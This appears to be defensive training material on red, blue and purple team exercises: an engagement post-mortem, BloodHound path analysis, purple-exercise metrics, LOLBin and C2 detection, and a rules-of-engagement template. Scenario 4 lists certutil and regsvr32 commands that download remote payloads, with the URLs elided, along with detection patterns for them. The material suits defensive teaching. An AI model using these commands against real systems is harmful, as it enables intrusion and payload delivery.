# Red / Blue / Purple Teaming — Deep Dive: Production Scenarios

---

## Scenario 1 — Red team reaches the crown jewels; where did blue fail?

**Engagement result.** Objective: read a file on the finance file
server. Red achieved it in 6 days. Blue's SIEM had ~120 detections.

**Stage-by-stage review (the only review that matters):**
```
stage              red action                          blue result
recon              OSINT + external scan               not detected (out of scope for logging)
initial-access     spearphish -> macro                 EMAIL gateway logged it, no alert rule
execution          PowerShell downloadcradle           logged; rule existed but AMSI bypass evaded it
persistence        scheduled task                      DETECTED (Sysmon 4698) -> alert -> closed as "IT change"
priv-esc           UAC bypass                          not detected
defense-evasion    disabled Defender via GPO           DETECTED -> alert fired day 5
cred-access        LSASS dump (comsvcs.dll)            DETECTED but same day, low priority queue
lateral-movement   PsExec to file server              DETECTED (5145/4624 type 3) -> escalated day 5
collection/exfil   copied file, DNS exfil              not detected
```

**Findings, prioritized:**
1. **The day-1 scheduled-task alert was closed as benign** — no
   enrichment (who, parent process, is this a known change window?).
   *Fix: require the alert to auto-pull parent process + user + change
   -ticket correlation before a human sees it.*
2. **PowerShell rule bypassed by AMSI evasion** — *add a detection for
   the bypass technique itself (AMSI patching patterns), not just the
   payload.*
3. **No priv-esc detection at all** — *T1548 backlog item.*
4. **LSASS dump was low priority** — *raise `lsass_handle_access` to
   critical; it had a 5% FP rate and 95% escalation rate (Module 17).*
5. **DNS exfil invisible** — *add beaconing + high-entropy-subdomain +
   volume-anomaly detection on DNS.*

Dwell time to first *actioned* alert: **5 days**. Target: hours.

---

## Scenario 2 — Running BloodHound as a defender

**Process.**
```
1. SharpHound / the BloodHound collectors -> ingest into BloodHound CE (Neo4j)
2. Mark the crown jewels (Tier 0: DCs, ADCS, the finance file server) as "high value"
3. Query: "shortest paths from Domain Users to any Tier 0 asset"
4. Query: "principals with a path to Domain Admin" ; "kerberoastable with a short path"
```

**Typical top findings and the single-control fixes:**
| Finding | Fix |
|---|---|
| Help-desk group has local admin on all workstations, and a DA logs into workstations | Tiered admin model; DAs never touch tier-2 hosts |
| A service account is kerberoastable and in a privileged group | 25+ char managed password (gMSA); remove from the group |
| `Unconstrained delegation` on a member server | Remove it; use constrained/RBCD |
| Local admin password identical across the fleet | LAPS / Windows LAPS (unique per host) |
| Cached DA credentials on a jump host reachable by tier-2 | Credential Guard; tier-0 PAWs only |

The point: recompute the shortest paths after each proposed control and
keep the one that lengthens or severs the most short paths for the least
operational pain. (Lab: `step2_lateral_movement.py` does exactly this
ablation.)

---

## Scenario 3 — A purple exercise, month by month

**Format:** monthly, 1 day. Red runs ~15 techniques from Atomic Red
Team + a few hand-crafted; blue watches live; both score together.

```
Month 1 scorecard:
  technique coverage      : 50%  (5/10 fired an alert)
  prevalence-weighted     : 55%
  mean MTTD (detected)    : 9 min
  top gaps: T1566 phishing (prev 9), T1053 sched task, T1548 priv-esc,
            T1087 discovery, T1041 exfil-over-C2

  -> action: build a phishing detection (attachment + macro + child process)

Month 2:
  technique coverage      : 60%  (6/10)
  prevalence-weighted     : 67%  (+12 pp)
  gaps: T1053, T1548, T1087, T1041

  -> action: T1548 (UAC bypass / fodhelper / sdclt patterns)

Month 6:
  prevalence-weighted     : 88%
  mean MTTD               : 5 min
  gaps: 2 low-prevalence techniques remaining
```

Closing the **highest-prevalence** gap each month moves the weighted
number more than closing a random one — the lab (`step3_purple_metrics.py`)
proves that. The curve going up *is* the deliverable.

---

## Scenario 4 — Detecting living-off-the-land (LOLBins)

**Red tradecraft:** no custom malware — `certutil -urlcache -f
http://... payload`, `regsvr32 /s /u /i:http://... scrobj.dll`,
`mshta`, `rundll32`, `wmic process call create`, `bitsadmin /transfer`.
These are signed Microsoft binaries, so AV won't flag them.

**Blue detections (behavioral, mapped to T1218 / T1105 / T1197):**
```
- certutil.exe with a URL in the command line and -urlcache/-f
- regsvr32.exe with /i: and a URL, or scrobj.dll
- rundll32.exe with no DLL that exists on disk, or an unusual parent
- mshta.exe launching from Office, or with http in args
- bitsadmin / BITS jobs downloading executables
- any of the above with a parent of winword/excel/outlook
```

**LOLBAS** (lolbas-project.github.io) is the reference list; every entry
is a detection you should have. Test with Atomic Red Team, tune the
allowlist against 30 days of benign use.

---

## Scenario 5 — C2 detection

**Red:** an HTTPS beacon, 60s callback with 30% jitter, sleeping,
domain-fronted or on a look-alike domain, small periodic requests.

**Blue signals (any one is weak; combine them — this is a great RBA
case, Module 19):**
- **Beaconing**: regular inter-arrival times to one destination
  (low variance after removing jitter), over hours.
- **JA3/JA4 fingerprint** of the TLS client matches a known C2
  framework's default.
- **Low request/response ratio**, tiny requests, over a long-lived
  connection.
- **Newly-registered / low-reputation domain**, or high-entropy DNS
  subdomains (DNS C2).
- **User-agent / header anomalies** vs the host's normal browser
  traffic.

(Encrypted-traffic detection is Module 14; this is its adversary-driven
sibling.)

---

## Rules of Engagement — the template

```
SCOPE
  In:  the corp AD forest, endpoints, the finance app and its file server
  Out: production customer-facing payment systems, anything in the DR site
OBJECTIVES (flags)
  1. Domain Admin  2. Read <specific file> on FS01  3. Persist through a reboot
ALLOWED
  Phishing (to a named pilot group), LOLBins, credential theft, lateral movement
NOT ALLOWED
  Destructive actions, DoS, modifying/deleting business data, real ransomware,
  social-engineering the SOC, physical intrusion
WINDOWS
  Business hours only; blackout during quarter-end close (Mar 25-31)
DECONFLICTION
  Red lead phone: ___  Blue lead: ___  "Is this you?" answered within 15 min
  If a real incident is suspected, red pauses and identifies immediately
REPORTING
  Daily standup with blue lead; full report + debrief within 2 weeks
```
